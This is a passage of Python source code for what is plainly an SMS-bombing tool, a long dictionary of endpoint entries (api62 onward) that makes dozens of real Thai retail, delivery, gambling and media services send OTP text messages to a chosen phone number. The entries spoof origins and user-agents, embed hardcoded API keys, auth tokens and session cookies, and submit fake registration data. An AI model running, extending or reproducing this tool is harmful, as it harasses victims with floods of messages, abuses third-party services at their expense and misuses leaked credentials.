        "url": "https://ezregis01.com/_ajax_/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ezregis01.com/", "https://ezregis01.com"),
        "data": lambda p: {"phoneNumber": p, "affSign": "e1af462f54b57749cb61e4ac010fd0ee"},
        "success_check": lambda r: strict_check(r, ['"success":true', '"status":1'])
    },
    "api62": {
        "name": "Dung919",
        "url": "https://mapi.dung919.com/api/otp/register",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dung919.com/", "https://dung919.com"),
        "data": lambda p: {"applicant": p, "serviceName": "dung919.com"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api63": {
        "name": "SET_Regis",
        "url": "https://api.set.or.th/api/member/registration",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.set.or.th/", "https://www.set.or.th"),
        "data": lambda p: {"citizenId": "1840201297389", "country": "th", "termFlag": "true", "subscriptionFlag": "true", "email": "bdjsss@gmail.com", "password": "090Kkk12", "gender": "M", "firstName": "สมชาย", "lastName": "ใจดี", "mobile": f"+66{no_zero(p)}", "captcha": ""},
        "success_check": lambda r: strict_check(r, ['"refID"', '"status":"SUCCESS"', '"success":true'])
    },
    "api64": {
        "name": "SET_OTP",
        "url": "https://api.set.or.th/api/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.set.or.th/", "https://www.set.or.th"),
        "data": lambda p: {"type": "REGISTRATION", "refID": "e865e7a6-e8c7-4adc-a204-90e5bca90ce0", "channel": "MOBILE"},
        "success_check": lambda r: strict_check(r, ['"refCode"', '"status":"SUCCESS"', '"success":true'])
    },
    "api65": {
        "name": "BioGaming",
        "url": "https://biogamin1-api.win.game/api/v3/otp/send",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "authorization": "Basic a7af349d858e91c6b96426a64148dc41b8de4e2b808537fb1f98556379769ff62d5295bb4d0e1302a91629744cad45d6d175c7752fec4b777536c160137b0c32", "user-agent": ua.random, "origin": "https://wallet.biogaming1.com", "referer": "https://wallet.biogaming1.com/"},
        "data": lambda p: {"tel": p, "otp_type": "register"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api66": {
        "name": "SportPlayAuto",
        "url": "https://gateway-sport.apija.tech/iamrobot/frontend/user/send-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://sport.playauto.cloud", "referer": "https://sport.playauto.cloud/"},
        "data": lambda p: {"tel": p, "prefix": "KDA"},
        "success_check": lambda r: strict_check(r, ["ส่งรหัส OTP", '"code":0'])
    },
    "api67": {
        "name": "Ufabet191",
        "url": "https://member.ufabet191.tv/api/auth/register-request-otp/",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest", "user-agent": ua.random, "origin": "https://member.ufabet191.tv", "referer": "https://member.ufabet191.tv/auth/register"},
        "data": lambda p: f"tel={p}&_token=Y8NI28Fne5GUrBncQbzPrOb0nOftBiqEa8Cf4rEp",
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api68": {
        "name": "LotusCash",
        "url": "https://api.lotuscash.cc/user/sendCode-h5",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": ua.random, "Origin": "https://h5.lotuscash.cc", "Referer": "https://h5.lotuscash.cc/"},
        "data": lambda p: f"mobile={p}",
        "success_check": lambda r: strict_check(r, ['"code":200', '"code":0', '"status":1'])
    },
    "api69": {
        "name": "Pop99",
        "url": "https://pop99.com/api/register-otp",
        "method": "POST",
        "headers": lambda: {"x-white-lable-name": "pop99", "x-exp-signature": "62ff52961948a80011b2ee2c", "content-type": "application/json", "user-agent": ua.random, "origin": "https://pop99.com", "referer": "https://pop99.com/?action=register&refer_code=rusUxi0PRd"},
        "data": lambda p: {"brands_id": "62ff52961948a80011b2ee2c", "tel": p, "token": ""},
        "success_check": lambda r: strict_check(r, ["ดำเนินการสำเร็จ", '"codeEXP":"001"'])
    },
    "api70": {
        "name": "CH3Plus",
        "url": "https://api-sso.ch3plus.com/user/request-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://accounts.ch3plus.com", "referer": "https://accounts.ch3plus.com/"},
        "data": lambda p: {"tel": p, "type": "login"},
        "success_check": lambda r: strict_check(r, ["OTP is requested", '"reference"'])
    },
    "api71": {
        "name": "DavyJones",
        "url": "https://davyjones.mrwed.cloud/customer/register/get-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "accept-language": "th", "user-agent": ua.random, "origin": "https://member.ufa058.com", "referer": "https://member.ufa058.com/"},
        "data": lambda p: {"countryCode": "TH", "phoneNumber": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200', '"ref"'])
    },
    "api72": {
        "name": "Ep789Bet",
        "url": "https://ep789bet.net/auth/send_otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "origin": "https://ep789bet.net", "referer": "https://ep789bet.net/register"},
        "data": lambda p: f"phone={p}&otp=&password=&bank=&bank_number=&full_name=&ref=",
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api73": {
        "name": "McShopReset",
        "url": "https://api.mcshop.com/cognito/me/forget-password",
        "method": "POST",
        "headers": lambda: {"x-store-token": "mcshop", "content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "x-auth-token": "O2d1ZXN0OzExNDcwNTg3OzIxODY1ODkyZTMzZGMwMGMzZjNlZmZlNDBlMmY3OTgzOzs7Ow==", "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3", "origin": "https://www.mcshop.com", "referer": "https://www.mcshop.com/"},
        "data": lambda p: {"username": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api74": {
        "name": "Msport1688",
        "url": "https://www.msport1688.com/auth/otp_sender",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "user-agent": ua.random, "origin": "https://www.msport1688.com", "referer": "https://www.msport1688.com/register?broker_ref_code=master"},
        "data": lambda p: f"phone={p}&otp=&password=&bank=&bank_number=&full_name=&ref=",
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api75": {
        "name": "LotussClub",
        "url": "https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.lotuss.com/", "https://www.lotuss.com"),
        "data": lambda p: {"mobile_phone_no": p},
        "success_check": lambda r: strict_check(r, ['"reference"', '"otp_ref"', '"status":"success"'])
    },
    "api76": {
        "name": "Watsons",
        "url": "https://api.watsons.co.th/api/v2/wtcth/forms/extendedActivateMemberCardForm/steps/wtcth_extendedActivateMemberCardForm_step1/validateAndPrepareNextStep?fields=ASIA_DEFAULT&lang=th&curr=THB",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://www.watsons.co.th", "referer": "https://www.watsons.co.th/"},
        "data": lambda p: {"otpTokenRequest": {"action": "ACTIVATE_MEMBER_CARD", "type": "SMS", "countryCode": "66", "target": p}, "defaultAddress": {"mobileNumberCountryCode": "66", "mobileNumber": p}, "mobileNumber": p},
        "success_check": lambda r: strict_check(r, ['"otpToken"', '"target"', '"reference"'])
    },
    "api77": {
        "name": "EventPass",
        "url": "https://services.eventpass.co/eventpass-accounts/otp/send",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "appid": "EVPAPP601129510b8d9205016493a3", "origin": "https://www.eventpass.co", "referer": "https://www.eventpass.co/"},
        "data": lambda p: {"send_to": p, "send_otp_type": "mobile", "otp_type": "register"},
        "success_check": lambda r: strict_check(r, ['"statusCode":200', '"ref_code"', '"token"'])
    },
    "api78": {
        "name": "AgPlus",
        "url": "https://practical13.hbsapi.com/sms/send-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "origin": "https://app.agplus.co", "referer": "https://app.agplus.co/"},
        "data": lambda p: {"phone": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api79": {
        "name": "MtsBlockchain",
        "url": "https://www.mtsblockchain.com/mgb-api/user/register/reqotp",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/json", "User-Agent": ua.random, "Origin": "https://www.mtsblockchain.com", "Referer": "https://www.mtsblockchain.com/register"},
        "data": lambda p: {"mobile": p},
        "success_check": lambda r: strict_check(r, ['"status":200', '"ref"', '"success":true'])
    },
    "api80": {
        "name": "Khonde",
        "url": "https://app.khonde.com/requestOTP/{phone}",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"status":200', '"ref"', '"success":true'])
    },
    "api81": {
        "name": "SaleHere",
        "url": "https://api.salehere.co.th/graphql",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://salehere.co.th", "referer": "https://salehere.co.th/"},
        "data": lambda p: {"operationName": "sendUserOTPV2", "variables": {"tel": p, "token": ""}, "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}},
        "success_check": lambda r: strict_check(r, ['"sendUserOTPV2"'])
    },
    "api82": {
        "name": "BestInc",
        "url": "https://api.best-inc.co.th/account/sendlogincode",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "User-Agent": ua.random, "Origin": "https://www.best-inc.co.th", "Referer": "https://www.best-inc.co.th/"},
        "data": lambda p: f"phoneNumber=%22{p}%22",
        "success_check": lambda r: strict_check(r, ['"success":true'])
    },
    "api83": {
        "name": "McShopOTP",
        "url": "https://api.mcshop.com/cognito/otp",
        "method": "POST",
        "headers": lambda: {"x-store-token": "mcshop", "content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "x-auth-token": "O2d1ZXN0OzExNDcwNTg3OzIxODY1ODkyZTMzZGMwMGMzZjNlZmZlNDBlMmY3OTgzOzs7Ow==", "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3", "origin": "https://www.mcshop.com", "referer": "https://www.mcshop.com/"},
        "data": lambda p: {"username": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api84": {
        "name": "ICQ",
        "url": "https://u.icq.net/api/v4/rapi",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random},
        "data": lambda p: {"method": "auth/sendCode", "reqId": f"{random.randint(10000,99999)}-1587490090", "params": {"phone": f"66{no_zero(p)}", "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
        "success_check": lambda r: strict_check(r, ['"code":20000'])
    },
    "api85": {
        "name": "HDMallResend",
        "url": "https://hdmall.co.th/phone_verifications?mobile={phone}&resend=true",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "X-Requested-With": "XMLHttpRequest", "Accept": "application/json"},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"status":"ok"', '"success":true', '"ref"'])
    },
    "api86": {
        "name": "JobBKK",
        "url": "https://api.jobbkk.com/v1/easy/otp_code",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"mobile={p}&ip=127.0.0.1&datenow=2026-10-21",
        "success_check": lambda r: strict_check(r, ['"status":true', '"status":200', '"ref"'])
    },
    "api87": {
        "name": "Droprich",
        "url": "https://app.droprich.co/agent/registergetsmsotp",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "user-agent": ua.random},
        "data": lambda p: f"phonenumber={p}",
        "success_check": lambda r: strict_check(r, ['"status":true', '"status":1', '"ref"'])
    },
    "api88": {
        "name": "Firster",
        "url": "https://graph.firster.com/graphql",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "organizationcode": "lifestyle", "content-type": "application/json"},
        "data": lambda p: {"operationName": "sendOtp", "variables": {"input": {"mobileNumber": no_zero(p), "phoneCode": "THA-66"}}, "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"},
        "success_check": lambda r: strict_check(r, ['"otpReference"'])
    },
    "api89": {
        "name": "UfaAutoBet",
        "url": "https://aws-autobet168.api-ufa.com/transfer/f/user/request-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://mob-wallet.autoeasy.io", "referer": "https://mob-wallet.autoeasy.io/"},
        "data": lambda p: {"phoneNumber": p, "prefix": "F2R41"},
        "success_check": lambda r: strict_check(r, ['"code":200', '"code":0', '"status":"success"'])
    },
    "api90": {
        "name": "Giztix",
        "url": "https://api.giztix.com/graphql",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "authorization": "null", "user-agent": ua.random, "origin": "https://app.giztix.com", "referer": "https://app.giztix.com/"},
        "data": lambda p: {"operationName": "OtpGeneratePhone", "variables": {"phone": f"66{p}"}, "query": "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},
        "success_check": lambda r: strict_check(r, ["otpGeneratePhone", '"ref"'])
    },
    "api91": {
        "name": "SboBet",
        "url": "https://api.sbobet.one/api/RegisterService/RequestOTP",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://app.sbobet.one", "referer": "https://app.sbobet.one/"},
        "data": lambda p: {"Phone": p},
        "success_check": lambda r: strict_check(r, ['"status":true', '"code":200', '"ref"'])
    },
    "api92": {
        "name": "NTBooster",
        "url": "https://covid19vaccine.ntplc.co.th/ntboosterapi/user/getOTP?telNumber={phone}",
        "method": "GET",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"status":200', '"ref"'])
    },
    "api93": {
        "name": "iShip",
        "url": "https://app.iship.cloud/api/ant/request-otp/{phone}",
        "method": "GET",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"status":true'])
    },
    "api94": {
        "name": "PgZeed",
        "url": "https://pgzeed.org/api/otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "user-agent": ua.random, "origin": "https://pgzeed.org", "referer": "https://pgzeed.org/?campGame=SLOT&s_=59"},
        "data": lambda p: {"phone_number": p, "register_type": ""},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api95": {
        "name": "HuayNaka",
        "url": "https://referral.huaynaka.com/v1/sendotp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "x-api-key": "Prmx2j2mZaaKwCR4jDyki9VANcKqF3565owwHgDE", "origin": "https://tang.huaynaka.com", "referer": "https://tang.huaynaka.com/"},
        "data": lambda p: {"phone": f"+66{no_zero(p)}"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200', '"ref"'])
    },
    "api96": {
        "name": "Zuma789",
        "url": "https://zuma789-backend.uwallet.link/api/otp/send",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "x-requested-with": "wallet-user", "user-agent": ua.random, "origin": "https://zuma789.uwallet.link", "referer": "https://zuma789.uwallet.link/"},
        "data": lambda p: {"phoneNumber": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api97": {
        "name": "SabuyEBuy",
        "url": "https://www.sabuyebuy.com/wp-json/api/v2/send-x",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json"},
        "data": lambda p: {"first_name": "askdhajshd", "last_name": "jhasjdhasjd", "address": "", "birthday": "", "phone": p, "commissions_id": "", "email_address": "aasdhas@Jhasd.asd", "password": "as257400", "agreements": "true", "uuid": "3f202dcd-8093-4ff9-a263-07ff7e9bd282", "affiliate_id": "1"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api98": {
        "name": "Cdfoi9",
        "url": "https://api.cdfoi9.com/api/v1/index.php",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"module=%2Fusers%2FgetVerificationCode&mobile={p}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",
        "success_check": lambda r: strict_check(r, ['"code":0', '"status":1'])
    },
    "api99": {
        "name": "BkkApi",
        "url": "https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"code":200', '"status":1'])
    },
    "api100": {
        "name": "MangoSlots",
        "url": "https://api.mango-slots.com/sexyline-ecp/api/v1/sms/sendVerificationCode/register",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json;charset=UTF-8"},
        "data": lambda p: {"mobile": f"66 {no_zero(p)}"},
        "success_check": lambda r: strict_check(r, ['"code":0', '"status":200'])
    },
    "api101": {
        "name": "OpenRice",
        "url": "https://th.openrice.com/api/v1/auth/signup/phone?uiLang=th&uiCity=bangkok",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-www-form-urlencoded", "accept": "application/json", "user-agent": ua.random},
        "data": lambda p: f"areaCode=66&phone={no_zero(p)}&regionId=400",
        "success_check": lambda r: strict_check(r, ['"success":true', '"status":200', '"token"'])
    },
    "api102": {
        "name": "JokerSlotzz",
        "url": "https://api.jokerslotzz.com/public/request-otp",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json;charset=UTF-8", "user-agent": ua.random, "origin": "https://member.jokerslotzz.com", "referer": "https://member.jokerslotzz.com/"},
        "data": lambda p: {"username": p},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"code":200'])
    },
    "api103": {
        "name": "Cars24",
        "url": "https://users.cars24.co.th/oauth/consumer-app/otp/{phone}?gaClientId=1814942739.1666373332&user-type=buyer&lang=th",
        "method": "GET",
        "headers": lambda: {"x_vehicle_type": "CAR", "x_platform": "mSite", "user-agent": ua.random, "x_country": "TH", "origin": "https://www.cars24.co.th"},
        "data": None,
        "success_check": lambda r: strict_check(r, ['"success":true', '"status":200', '"otp"'])
    },
    "api104": {
        "name": "The1",
        "url": "https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.the1.co.th/", "https://www.the1.co.th"),
        "data": lambda p: {"on": {"value": p, "country": "66"}, "type": "mobile"},
        "success_check": lambda r: strict_check(r, ['"refCode"', '"status":"success"', '"otp"'])
    },
    "api105": {
        "name": "AISPlay",
        "url": "https://srfng.ais.co.th/login/sendOneTimePW",
        "method": "POST",
        "headers": lambda: {"User-Agent": ua.random, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda p: f"msisdn=66{no_zero(p)}&serviceId=AISPlay&accountType=all&otpChannel=sms",
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"transactionId"'])
    },
    "api106": {
        "name": "ThaiSME",
        "url": "https://api.thaisme.one/smegp/register/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers(),
        "data": lambda p: {"MOBILE": p},
        "success_check": lambda r: strict_check(r, ['"status":200', '"ref"', '"success":true'])
    },
    "api107": {
        "name": "Fairdee",
        "url": "https://api.fairdee.co.th/profile/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://app.fairdee.co.th/", "https://app.fairdee.co.th"),
        "data": lambda p: {"username": p, "username_type": "phone", "intent": "signup"},
        "success_check": lambda r: strict_check(r, ['"status":"success"', '"ref"', '"otp"'])
    },
    "api108": {
        "name": "OnePlayBet",
        "url": "https://api-member.oneplaybet.com/user/register/otp",
        "method": "POST",
        "headers": lambda: get_common_headers(),
        "data": lambda p: {"mobileNumber": p, "partnerKey": "XPB289TOP113"},
        "success_check": lambda r: strict_check(r, ['"isSuccess":true'])
    },
    "api109": {
        "name": "MonkeyEveryday",
        "url": "https://api.monkeyeveryday.com/graphql",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json", "origin": "https://monkeyeveryday.com", "referer": "https://monkeyeveryday.com/"},
        # แก้บั๊กจาก {p} (set) เป็น {"phone": p} (dict)
        "data": lambda p: {"operationName": "requestRegistrationOtp", "variables": {"phone": p}, "query": "mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    __typename\n  }\n}\n"},
        "success_check": lambda r: strict_check(r, ["requestRegistrationOtp", '"token"'])
    },
    "api110": {
        "name": "YellowTire",
        "url": "https://api.yellowtire.com/api/user/request-otp",
        "method": "POST",
        "headers": lambda: {"Content-Type": "application/json", "User-Agent": ua.random, "Origin": "https://www.yellowtire.com", "Referer": "https://www.yellowtire.com/"},
        "data": lambda p: {"tel": p},
        "success_check": lambda r: strict_check(r, ['"success":true'])
    },
    "api111": {
        "name": "Swopmart",
        "url": "https://api.swopmart.co.th/graphql",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json"},
        "data": lambda p: {"operationName": "requestOtpPhoneNumber", "variables": {"phoneNumber": p}, "query": "mutation requestOtpPhoneNumber($phoneNumber: String!) {\n  requestOtpPhoneNumber(phoneNumber: $phoneNumber)\n}"},
        "success_check": lambda r: strict_check(r, ["requestOtpPhoneNumber"])
    },
    "api112": {
        "name": "BigC",
        "url": "https://openapi.bigc.co.th/customer/v1/otp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json", "origin": "https://www.bigc.co.th", "referer": "https://www.bigc.co.th/"},
        "data": lambda p: {"phone_no": p},
        "success_check": lambda r: strict_check(r, ['"status":200', '"ref"', '"success":true'])
    },
    "api113": {
        "name": "1Ufa",
        "url": "https://1ufa.bet/_ajax_/request-otp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "Content-Type": "application/x-www-form-urlencoded", "cookie": "PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk"},
        # แก้เป็น form string เพื่อให้ตรงกับ Content-Type: application/x-www-form-urlencoded
        "data": lambda p: f"request_otp%5BphoneNumber%5D={p}&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M",
        "success_check": lambda r: r.strip() == "[]" or strict_check(r, ['"success":true'])
    },

    # ==========================================
    # 🚀 ENDPOINTS เพิ่มเติมชุดใหญ่ (api114 - api160)
    # ==========================================
    "api114": {
        "name": "Pizza1112-Login",
        "url": "https://api.1112.com/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://1112.com/", "https://1112.com"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api115": {
        "name": "DairyQueenTH",
        "url": "https://api.dairyqueenthailand.com/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.dairyqueenthailand.com/", "https://www.dairyqueenthailand.com"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api116": {
        "name": "Swensens1112",
        "url": "https://api.swensens1112.com/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.swensens1112.com/", "https://www.swensens1112.com"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api117": {
        "name": "BurgerKingTH",
        "url": "https://api.burgerking.co.th/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.burgerking.co.th/", "https://www.burgerking.co.th"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api118": {
        "name": "BonchonTH",
        "url": "https://api.bonchonthailand.com/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.bonchonthailand.com/", "https://www.bonchonthailand.com"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api119": {
        "name": "SizzlerTH",
        "url": "https://api.sizzler.co.th/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.sizzler.co.th/", "https://www.sizzler.co.th"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api120": {
        "name": "TheCoffeeClubTH",
        "url": "https://api.thecoffeeclub.co.th/api/v1/otp/create",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.thecoffeeclub.co.th/", "https://www.thecoffeeclub.co.th"),
        "data": lambda p: {"phonenumber": p, "language": "th"},
        "success_check": lambda r: strict_check(r, ['"status":1', '"detail":"success"', '"ref"'])
    },
    "api121": {
        "name": "CH3Plus-Register",
        "url": "https://api-sso.ch3plus.com/user/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://accounts.ch3plus.com/", "https://accounts.ch3plus.com"),
        "data": lambda p: {"tel": p, "type": "register"},
        "success_check": lambda r: strict_check(r, ["OTP is requested", '"reference"'])
    },
    "api122": {
        "name": "CH3Plus-Forget",
        "url": "https://api-sso.ch3plus.com/user/request-otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://accounts.ch3plus.com/", "https://accounts.ch3plus.com"),
        "data": lambda p: {"tel": p, "type": "forget_password"},
        "success_check": lambda r: strict_check(r, ["OTP is requested", '"reference"'])
    },
    "api123": {
        "name": "NocNoc-Login",
        "url": "https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nocnoc.com/", "https://nocnoc.com"),
        "data": lambda p: {"lang": "th", "userType": "BUYER", "locale": "th", "orgIdfier": "scg", "phone": f"+66{no_zero(p)}", "type": "login", "otpTemplate": "buyer_login_otp_message"},
        "success_check": lambda r: strict_check(r, ['"status":"SUCCESS"', '"otpId"'])
    },
    "api124": {
        "name": "BugabooTV-Forgot",
        "url": "https://cognito-idp.ap-southeast-1.amazonaws.com/",
        "method": "POST",
        "headers": lambda: {"content-type": "application/x-amz-json-1.1", "x-amz-target": "AWSCognitoIdentityProviderService.ForgotPassword", "user-agent": ua.random, "referer": "https://www.bugaboo.tv/members/resetpass/phone"},
        "data": lambda p: {"ClientId": "6g47av6ddfcvi06v4l186c16d6", "Username": f"+66{no_zero(p)}"},
        "success_check": lambda r: strict_check(r, ["CodeDeliveryDetails", "Destination"])
    },
    "api125": {
        "name": "Freshket-Zero",
        "url": "https://api-next-version.freshket.co/baseApi/Users/RequestOtp",
        "method": "POST",
        "headers": lambda: {"user-agent": ua.random, "content-type": "application/json;charset=UTF-8", "x-guest": "Julian"},
        "data": lambda p: {"isDev": "false", "language": "th", "phone": f"+66{p}"},
        "success_check": lambda r: strict_check(r, ['"is_success":true', '"data":true'])
    },
    "api126": {
        "name": "Giztix-NoZero",
        "url": "https://api.giztix.com/graphql",
        "method": "POST",
        "headers": lambda: {"content-type": "application/json", "authorization": "null", "user-agent": ua.random, "origin": "https://app.giztix.com", "referer": "https://app.giztix.com/"},
        "data": lambda p: {"operationName": "OtpGeneratePhone", "variables": {"phone": f"66{no_zero(p)}"}, "query": "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},
        "success_check": lambda r: strict_check(r, ["otpGeneratePhone", '"ref"'])
    },
    "api127": {
        "name": "FlashExpress",
        "url": "https://flashexpress.com/fle/api/v1/otp/send",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flashexpress.com/", "https://flashexpress.com"),
        "data": lambda p: {"phone": p, "countryCode": "66", "type": "login"},
        "success_check": lambda r: strict_check(r, ['"code":1', '"code":200', '"status":"success"'])
    },
    "api128": {
        "name": "J&T-ExpressTH",
        "url": "https://jenius.jtexpress.co.th/api/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://jtexpress.co.th/", "https://jtexpress.co.th"),
        "data": lambda p: {"phone": p, "country_code": "66"},
        "success_check": lambda r: strict_check(r, ['"status":true', '"code":200', '"ref"'])
    },
    "api129": {
        "name": "NinjaVanTH",
        "url": "https://api.ninjavan.co/th/dash/1.0/Public/otp",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.ninjavan.co/th-th", "https://www.ninjavan.co"),
        "data": lambda p: {"phone_number": f"+66{no_zero(p)}"},
        "success_check": lambda r: strict_check(r, ['"status":"SUCCESS"', '"ref"', '"otp"'])
    },
    "api130": {
        "name": "TrueID-OTP",
        "url": "https://iam.trueid.net/api/v1/otp/request",
        "method": "POST",
        "headers": lambda: get_common_headers("https://home.trueid.net/", "https://home.trueid.net"),
        "data": lambda p: {"msisdn": f"66{no_zero(p)}", "lang": "th"},
        "success_check": lambda r: strict_check(r, ['"code":200', '"ref_code"'])
    },
    "api131": {
        "name": "AllOnline-7Eleven",
